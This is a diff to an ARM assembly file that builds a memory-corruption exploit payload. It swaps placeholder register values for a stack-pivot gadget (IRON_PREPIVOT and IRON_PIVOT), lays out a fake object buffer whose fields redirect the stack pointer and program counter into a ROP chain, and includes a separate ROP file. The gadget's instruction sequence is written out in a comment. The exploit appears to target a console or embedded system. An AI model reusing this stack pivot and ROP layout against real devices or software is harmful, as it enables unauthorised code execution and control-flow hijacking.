@@ -21,15 +21,14 @@
 	.word OBJECT_BUFFER_REF_PTR ; r4 (moved to r0 before jump)
 
 .orga 0x400
-		.word 0xBADB00B5 ; r0
-		.word 0xF00DC0DE ; r2
-		.word 0xDAD0DEAD ; r3
-		.word 0xBAD0CAFE ; r7
-		.word 0xDEADC0DE ; ip
+	object_reference: ; r0 points here after IRON_PREPIVOT
+		.word OBJECT_BUFFER_PTR ; r0 (temporarily)
+
+.orga 0x468
+		.word IRON_PIVOT
 		.word ROP_PTR ; sp
 		.word ROP_IRON_NOP ; pc
-	object_reference:
-		.word OBJECT_BUFFER_PTR ; r0 (temporarily)
+
 
 .orga 0x500
 	object_buffer:
@@ -37,7 +36,7 @@
 		.word 0xDADADADA
 		.word 0xDADADADA
 		.word 0xDADADADA
-		.word STACK_PIVOT_PTR ; r1
+		.word IRON_PREPIVOT ; r1 ; ldr r1, [r0, #0x68]!; sub sp, sp, #32; add r0, r0, #8; blx r1
 
 .orga 0x600
 	.include "iron_rop.s"
